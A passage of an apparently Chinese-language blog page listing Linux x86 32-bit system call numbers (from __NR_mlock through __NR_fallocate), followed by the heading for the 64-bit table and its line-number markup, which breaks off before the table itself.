149</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock      150</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock        151</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall       152</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall     153</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam     154</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam     155</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler     156</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler     157</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield        158</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval  161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep      162</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap     163</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid      164</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid      165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86       166</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module   167</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll       168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl     169</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid      170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid      171</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl          172</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn   173</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction   174</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending  176</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait    177</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo    178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend  179</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64        180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64       181</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown      182</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd     183</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget     184</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset     185</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack    186</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile       187</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg        188 <span class="comment">/* some people actually want streams */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg        189 <span class="comment">/* some people actually want streams */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork      190</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ugetrlimit     191 <span class="comment">/* SuS compliant getrlimit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap2      192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate64     193</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate64    194</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat64     195</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat64        196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat64        197</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown32       198</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid32       199</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid32       200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid32      201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid32      202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid32     203</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid32     204</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups32    205</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups32    206</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown32       207</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid32    208</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid32    209</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid32    210</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid32    211</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown32        212</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid32       213</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid32       214</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid32     215</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid32     216</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root     217</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore        218</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise        219</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise1       219 <span class="comment">/* delete when C lib stub is removed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64     220</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl64        221</span></span><br><span class="line"><span class="comment">/* 223 is unused */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid     224</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead      225</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr       226</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr      227</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr      228</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr       229</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr      230</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr      231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr      232</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr     233</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr     234</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr    235</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr   236</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr   237</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill      238</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile64     239</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex      240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity  241</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity  242</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area    243</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area    244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup       245</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy     246</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents   247</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit      248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel      249</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64      250</span></span><br><span class="line"><span class="comment">/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group     252</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create   254</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl      255</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait     256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages   257</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address    258</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create   259</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime  (__NR_timer_create+1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime  (__NR_timer_create+2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun   (__NR_timer_create+3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete   (__NR_timer_create+4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime  (__NR_timer_create+5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime  (__NR_timer_create+6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres   (__NR_timer_create+7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep    (__NR_timer_create+8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs64       268</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs64      269</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill     270</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes     271</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64_64   272</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver        273</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind      274</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy  275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy  276</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open        277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink      (__NR_mq_open+1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend   (__NR_mq_open+2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive    (__NR_mq_open+3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify      (__NR_mq_open+4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr  (__NR_mq_open+5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load     283</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid     284</span></span><br><span class="line"><span class="comment">/* #define __NR_sys_setaltroot  285 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key        286</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key    287</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl     288</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set     289</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get     290</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init   291</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch  292</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch   293</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages  294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat     295</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat        296</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat        297</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat       298</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat      299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatat64      300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat       301</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat       302</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat     303</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat      304</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat     305</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat       306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat      307</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6       308</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll      309</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare        310</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list    311</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list    312</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice     313</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range    314</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee        315</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice       316</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages     317</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu     318</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait    319</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat      320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd       321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd        322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd        323</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate      324</span></span><br></pre></td></tr></table></figure><p><strong>x86平台64位Linux系统调用号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span 